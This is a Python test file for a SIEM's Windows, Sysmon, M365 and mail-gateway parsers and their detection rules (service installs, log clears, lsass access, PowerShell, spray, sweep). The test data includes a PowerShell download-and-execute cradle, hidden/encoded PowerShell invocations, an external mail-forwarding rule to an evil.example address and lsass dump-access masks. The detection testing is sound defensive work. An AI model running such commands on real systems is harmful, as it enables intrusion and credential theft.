r"""2026-10-20 recall work: Windows service install (7045/4697), audit-log cleared (1102/104) and
Sysmon ProcessAccess (10) parse to class 1002, and the three new rules fire / stay quiet correctly.

Run: python services/ws2-normalization/parsers/test_recall_events.py
"""
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
ROOT = HERE.parent.parent.parent
sys.path[:0] = [str(ROOT / "services"), str(ROOT / "services" / "ws2-normalization"),
                str(ROOT / "services" / "ws4-detection")]

from engine import load_rules  # noqa: E402
from parsers import _REGISTRY  # noqa: E402

FAILS: list = []


def check(cond, msg):
    if not cond:
        FAILS.append(msg)


def parse(src, rec):
    return _REGISTRY[src].parse({"source_type": src, "raw": rec, "meta": {"ingest_id": "t-" + str(rec["EventID"])}})


def rule(rid):
    return next(r for r in load_rules(ROOT / "contracts" / "rules") if r.title == rid)


T = 1750000000000
svc_tmp = parse("windows_eventlog", {"EventID": 7045, "TimeCreated": T, "Computer": "wks1", "SubjectUserName": "jdoe",
                                     "ServiceName": "Upd", "ImagePath": r"C:\Users\jdoe\AppData\Local\Temp\u.exe"})
svc_ok = parse("windows_eventlog", {"EventID": 7045, "TimeCreated": T, "Computer": "wks1",
                                    "ServiceName": "Spooler", "ImagePath": r"C:\Windows\System32\spoolsv.exe"})
svc_4697 = parse("windows_eventlog", {"EventID": 4697, "TimeCreated": T, "Computer": "dc1", "SubjectUserName": "adm",
                                      "ServiceName": "x", "ServiceFileName": "%COMSPEC% /c calc"})
clr_sec = parse("windows_eventlog", {"EventID": 1102, "TimeCreated": T, "Computer": "dc1", "SubjectUserName": "adm"})
clr_sys = parse("windows_eventlog", {"EventID": 104, "TimeCreated": T, "Computer": "dc1", "SubjectUserName": "adm"})
for ev, act in ((svc_tmp, 3), (svc_ok, 3), (svc_4697, 3), (clr_sec, 4), (clr_sys, 4)):
    got = ev and (ev["class_uid"], ev["activity_id"])
    check(got == (1002, act), f"class/activity wrong: {got}")
check(svc_tmp["unmapped"]["service"]["suspicious_path"] is True, "temp-path service must be suspicious")
check(svc_ok["unmapped"]["service"]["suspicious_path"] is False, "System32 service must not be suspicious")
check(svc_4697["unmapped"]["service"]["suspicious_path"] is True, "%COMSPEC% service must be suspicious")

sysmon10 = {"EventID": 10, "TimeCreated": T, "Computer": "wks1", "SourceProcessId": "99",
            "TargetImage": r"C:\Windows\System32\lsass.exe", "GrantedAccess": "0x1010"}
bad = parse("sysmon", dict(sysmon10, SourceImage=r"C:\Users\jdoe\Downloads\dump.exe"))
trusted = parse("sysmon", dict(sysmon10, SourceImage=r"C:\Windows\System32\wininit.exe"))
other_target = parse("sysmon", dict(sysmon10, SourceImage=r"C:\x\a.exe", TargetImage=r"C:\Windows\explorer.exe"))
benign_mask = parse("sysmon", dict(sysmon10, SourceImage=r"C:\x\a.exe", GrantedAccess="0x1000"))
check(bad["class_uid"] == 1002 and bad["activity_id"] == 5, "sysmon 10 must be class 1002 activity 5")
check(bad["unmapped"]["lsass_access_suspicious"] is True, "dump.exe -> lsass 0x1010 must be suspicious")
check(trusted["unmapped"]["lsass_access_suspicious"] is False, "wininit -> lsass must be trusted")
check(other_target["unmapped"]["lsass_access_suspicious"] is False, "non-lsass target must not be suspicious")
check(benign_mask["unmapped"]["lsass_access_suspicious"] is False, "benign mask must not be suspicious")

R_CLR, R_SVC, R_LSA = (rule("Windows audit log cleared"), rule("Service installed from a suspicious path"),
                       rule("Suspicious process access to lsass.exe"))
check(R_CLR.evaluate(clr_sec) and R_CLR.evaluate(clr_sys), "log-cleared rule must fire on 1102 and 104")
check(not R_CLR.evaluate(svc_tmp), "log-cleared rule must not fire on a service install")
check(R_SVC.evaluate(svc_tmp) and R_SVC.evaluate(svc_4697), "service rule must fire on suspicious paths")
check(not R_SVC.evaluate(svc_ok), "service rule must not fire on System32")
check(R_LSA.evaluate(bad), "lsass rule must fire on a dump-style access")
check(not R_LSA.evaluate(trusted) and not R_LSA.evaluate(benign_mask) and not R_LSA.evaluate(other_target),
      "lsass rule must stay quiet on trusted caller / benign mask / other target")

# ---- PowerShell logging (4104 / 4103 / 800) and AD attribute change (5136)
ps_bad = parse("windows_eventlog", {"EventID": 4104, "TimeCreated": T, "Computer": "wks1",
                                    "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')"})
ps_enc = parse("windows_eventlog", {"EventID": 4103, "TimeCreated": T, "Computer": "wks1",
                                    "Payload": "powershell -enc " + "QQBBAEEA" * 8})
ps_weak2 = parse("windows_eventlog", {"EventID": 800, "TimeCreated": T, "Computer": "wks1",
                                      "Data": ["iex $x; powershell -nop -w hidden"]})
ps_ok = parse("windows_eventlog", {"EventID": 4104, "TimeCreated": T, "Computer": "wks1",
                                   "ScriptBlockText": "Get-ChildItem C:/logs | Sort-Object Length"})
ps_one_weak = parse("windows_eventlog", {"EventID": 4104, "TimeCreated": T, "Computer": "wks1",
                                         "ScriptBlockText": "Start-Process notepad"})
for ev in (ps_bad, ps_enc, ps_weak2, ps_ok, ps_one_weak):
    check(ev and (ev["class_uid"], ev["activity_id"]) == (1002, 6), "PowerShell log must be class 1002 activity 6")
check(ps_bad["unmapped"]["powershell"]["suspicious"] and ps_enc["unmapped"]["powershell"]["suspicious"],
      "download-cradle and long -enc payload must be suspicious")
check(ps_weak2["unmapped"]["powershell"]["suspicious"], "two weak indicators must be suspicious")
check(not ps_ok["unmapped"]["powershell"]["suspicious"] and not ps_one_weak["unmapped"]["powershell"]["suspicious"],
      "benign script and a single weak indicator must not be suspicious")
R_PS = rule("Suspicious PowerShell script content")
check(R_PS.evaluate(ps_bad) and R_PS.evaluate(ps_enc) and not R_PS.evaluate(ps_ok), "powershell rule fire/quiet")

ds_spn = parse("windows_eventlog", {"EventID": 5136, "TimeCreated": T, "Computer": "dc1", "SubjectUserName": "adm",
                                    "ObjectDN": "CN=svc,DC=corp", "ObjectClass": "user",
                                    "AttributeLDAPDisplayName": "servicePrincipalName", "AttributeValue": "x/y",
                                    "OperationType": "%%14674"})
ds_desc = parse("windows_eventlog", {"EventID": 5136, "TimeCreated": T, "Computer": "dc1", "SubjectUserName": "adm",
                                     "ObjectDN": "CN=svc,DC=corp", "AttributeLDAPDisplayName": "description"})
check(ds_spn["class_uid"] == 3003 and ds_spn["activity_id"] == 6, "5136 must be class 3003 activity 6")
check(ds_spn["unmapped"]["directory"]["sensitive_attribute"] is True, "SPN change must be sensitive")
check(ds_desc["unmapped"]["directory"]["sensitive_attribute"] is False, "description change must not be sensitive")
R_DS = rule("Sensitive Active Directory attribute modified")
check(R_DS.evaluate(ds_spn) and not R_DS.evaluate(ds_desc), "AD attribute rule fire/quiet")

# ---- M365 inbox-rule forwarding and macro-attachment mail (parsers shipped 2026-10-14, rules 2026-10-20)
def parse_raw(src, rec):
    return _REGISTRY[src].parse({"source_type": src, "raw": rec, "meta": {"ingest_id": "t-" + src}})


m_fwd = parse_raw("m365_audit", {"Operation": "New-InboxRule", "Workload": "Exchange", "UserId": "jdoe@corp.example",
                                 "ClientIP": "203.0.113.51:50432", "CreationTime": "2026-07-20T10:00:00Z",
                                 "Parameters": [{"Name": "ForwardTo", "Value": "x@evil.example"}]})
m_int = parse_raw("m365_audit", {"Operation": "New-InboxRule", "Workload": "Exchange", "UserId": "jdoe@corp.example",
                                 "ClientIP": "203.0.113.51:50432", "CreationTime": "2026-07-20T10:00:00Z",
                                 "Parameters": [{"Name": "ForwardTo", "Value": "boss@corp.example"}]})
m_other = parse_raw("m365_audit", {"Operation": "MailItemsAccessed", "Workload": "Exchange", "UserId": "jdoe@corp.example",
                                   "ClientIP": "203.0.113.51", "CreationTime": "2026-07-20T10:00:00Z"})
R_M = rule("Mailbox rule forwards mail to an external address")
check(R_M.evaluate(m_fwd), "external forwarding inbox rule must fire")
check(not R_M.evaluate(m_int) and not R_M.evaluate(m_other), "internal forward / unrelated op must stay quiet")

mail = {"from": "billing@vendor.example", "to": "jdoe@corp.example", "subject": "Invoice", "ts": 1750000000000,
        "src_ip": "203.0.113.200"}
e_ok = parse_raw("mail_gateway", dict(mail, attachment="Invoice.docm", verdict="delivered"))
e_blocked = parse_raw("mail_gateway", dict(mail, attachment="Invoice.docm", verdict="quarantined"))
e_plain = parse_raw("mail_gateway", dict(mail, attachment="Invoice.pdf", verdict="delivered"))
e_out = parse_raw("mail_gateway", dict(mail, attachment="Invoice.docm", verdict="delivered", direction="outbound"))
R_E = rule("Inbound email with a macro-capable attachment was delivered")
check(R_E.evaluate(e_ok), "delivered inbound macro attachment must fire")
check(not R_E.evaluate(e_blocked), "quarantined macro attachment must stay quiet")
check(not R_E.evaluate(e_plain), "non-macro attachment must stay quiet")
check(not R_E.evaluate(e_out), "outbound mail must stay quiet")

# ---- owner-approved trio (2026-10-20): Office->shell launch, one-source password spray, horizontal sweep ----
word = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
sy1 = {"EventID": 1, "TimeCreated": T, "Computer": "wks1", "User": "CORP\\jdoe", "ProcessId": "10",
       "CommandLine": "cmd /c whoami"}
spawn = parse("sysmon", dict(sy1, Image=r"C:\Windows\System32\cmd.exe", ParentImage=word))
benign = parse("sysmon", dict(sy1, Image=r"C:\Windows\System32\cmd.exe", ParentImage=r"C:\Windows\explorer.exe"))
office_notepad = parse("sysmon", dict(sy1, Image=r"C:\Windows\notepad.exe", ParentImage=word))
w4688 = parse("windows_eventlog", {"EventID": 4688, "TimeCreated": T, "Computer": "wks1", "SubjectUserName": "jdoe",
                                   "NewProcessName": r"C:\Windows\System32\wscript.exe", "ParentProcessName": word})
check(spawn["unmapped"]["process_launch"]["suspicious"] is True, "winword -> cmd must be suspicious")
check(benign["unmapped"]["process_launch"]["suspicious"] is False, "explorer -> cmd must not be suspicious")
check(office_notepad["unmapped"]["process_launch"]["suspicious"] is False, "winword -> notepad must not be suspicious")
check(w4688["unmapped"]["process_launch"]["suspicious"] is True, "4688 winword -> wscript must be suspicious")
R_OFF = rule("Document host spawned a shell or script host")
check(R_OFF.evaluate(spawn) and R_OFF.evaluate(w4688), "office-spawn rule must fire on sysmon 1 and 4688")
check(not R_OFF.evaluate(benign) and not R_OFF.evaluate(office_notepad), "office-spawn rule must stay quiet on benign launches")

R_SPR = rule("Password spray (one source failing against many distinct accounts)")
check(R_SPR.stateful and R_SPR.distinct_field == "actor.user.name", "spray rule must count distinct accounts per source")
BASE = 1_750_000_000_000


def fail_auth(src, user, i):
    return {"class_uid": 3002, "activity_id": 4, "time": BASE + i * 100, "actor": {"user": {"name": user}},
            "src_endpoint": {"ip": src}, "siem": {"ingest_id": f"sp-{src}-{i}"}}


fired = [R_SPR.evaluate(fail_auth("203.0.113.50", f"user{i}", i)) for i in range(8)]
check(fired[:7] == [False] * 7 and fired[7] is True, "spray: 8th distinct account must fire, 7 must not")
same = [R_SPR.evaluate(fail_auth("203.0.113.51", "admin", i)) for i in range(30)]
check(not any(same), "spray: 30 failures against ONE account (brute force) must stay quiet")

R_SWP = rule("Horizontal sweep (one source denied across many distinct hosts)")
check(R_SWP.stateful and R_SWP.distinct_field == "dst_endpoint.ip", "sweep rule must count distinct destination hosts")


def deny(src, dst, port, i):
    return {"class_uid": 4001, "activity_id": 6, "time": BASE + i * 100, "src_endpoint": {"ip": src},
            "dst_endpoint": {"ip": dst, "port": port}, "siem": {"ingest_id": f"sw-{src}-{i}"}}


fired = [R_SWP.evaluate(deny("203.0.113.60", f"10.0.0.{i + 1}", 445, i)) for i in range(15)]
check(fired[:14] == [False] * 14 and fired[14] is True, "sweep: 15th distinct host must fire, 14 must not")
vert = [R_SWP.evaluate(deny("203.0.113.61", "10.0.0.1", 1000 + i, i)) for i in range(30)]
check(not any(vert), "sweep: 30 ports on ONE host (vertical scan) must stay quiet")

# ---- PR #112 review fixes (2026-10-21) ----
# EventIDs are per provider: another provider's 104 / 800 must not become a log clear / PowerShell event.
check(parse("windows_eventlog", {"EventID": 104, "TimeCreated": T, "Computer": "h",
                                 "Channel": "Microsoft-Windows-Other/Operational"}) is None, "104 from another channel")
check(parse("windows_eventlog", {"EventID": 104, "TimeCreated": T, "Computer": "h", "Channel": "System",
                                 "ProviderName": "Some-Driver"}) is None, "104 from another provider in System")
check(parse("windows_eventlog", {"EventID": 800, "TimeCreated": T, "Computer": "h", "Channel": "Application"}) is None,
      "800 outside 'Windows PowerShell'")
clr_scoped = parse("windows_eventlog", {"EventID": 104, "TimeCreated": T, "Computer": "h", "Channel": "System",
                                        "Provider": {"Name": "Microsoft-Windows-Eventlog"}})
check(clr_scoped and R_CLR.evaluate(clr_scoped), "real System/Eventlog 104 must still fire")
check(parse("windows_eventlog", {"EventID": 4624, "TimeCreated": T, "Computer": "h", "Channel": "Security",
                                 "TargetUserName": "u"}) is not None, "unscoped EventIDs are unaffected")
# Trusted lsass callers match the full path, not the basename; any dump-capable mask counts.
for src, acc, want in ((r"C:\Users\Public\MsMpEng.exe", "0x1010", True), (r"C:\Temp\csrss.exe", "0x1010", True),
                       (r"D:\Windows\System32\csrss.exe", "0x1010", False),
                       (r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1\MsMpEng.exe", "0x1fffff", False),
                       (r"C:\x\dump.exe", "0x1011", True), (r"C:\x\dump.exe", "0x1418", True),
                       (r"C:\x\dump.exe", "0x1400", False), (r"C:\x\dump.exe", "junk", False)):
    ev = parse("sysmon", dict(sysmon10, SourceImage=src, GrantedAccess=acc))
    check(ev["unmapped"]["lsass_access_suspicious"] is want, f"lsass {src} {acc} -> want {want}")
# Unexpanded environment-variable service paths.
for p in (r"%TEMP%\evil.exe", r"%APPDATA%\x\svc.exe", r"%PUBLIC%\svc.exe", r"%ProgramData%\svc.exe"):
    ev = parse("windows_eventlog", {"EventID": 7045, "TimeCreated": T, "Computer": "h", "ServiceName": "s", "ImagePath": p})
    check(ev["unmapped"]["service"]["suspicious_path"] is True, f"service path {p} must be suspicious")
# Every -EncodedCommand prefix PowerShell accepts; a short argument after -e is not a payload.
b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAu"
for flag in ("-e", "-ec", "-en", "-enc", "-enco", "-EncodedCommand", "/enc", "\u2013enc"):
    ev = parse("windows_eventlog", {"EventID": 800, "TimeCreated": T, "Computer": "h", "HostApplication": f"powershell {flag} {b64}"})
    check(ev["unmapped"]["powershell"]["suspicious"] is True, f"encoded command via {flag!r} must be suspicious")
ev = parse("windows_eventlog", {"EventID": 4104, "TimeCreated": T, "Computer": "h",
                                "ScriptBlockText": "Get-Item -ErrorAction SilentlyContinue C:/x; Set-Content -Encoding utf8 x y"})
check(ev["unmapped"]["powershell"]["suspicious"] is False, "-ErrorAction / -Encoding are not -EncodedCommand")
# Activity 3 means service install (windows_eventlog) AND process terminate (sysmon EID 5): the service rule must
# not fire on a terminate, even one of a binary in a temp dir.
term = parse("sysmon", {"EventID": 5, "TimeCreated": T, "Computer": "h", "ProcessId": "7",
                        "Image": r"C:\Users\jdoe\AppData\Local\Temp\u.exe"})
check(term["activity_id"] == 3 and not R_SVC.evaluate(term), "service rule must not fire on sysmon terminate")

if FAILS:
    for f in FAILS:
        print("[FAIL]", f)
    sys.exit(1)
print("[OK] service-install, log-cleared, lsass, PowerShell, AD-attribute events and the Office-spawn / spray / sweep rules "
      "parse and fire/stay quiet correctly")
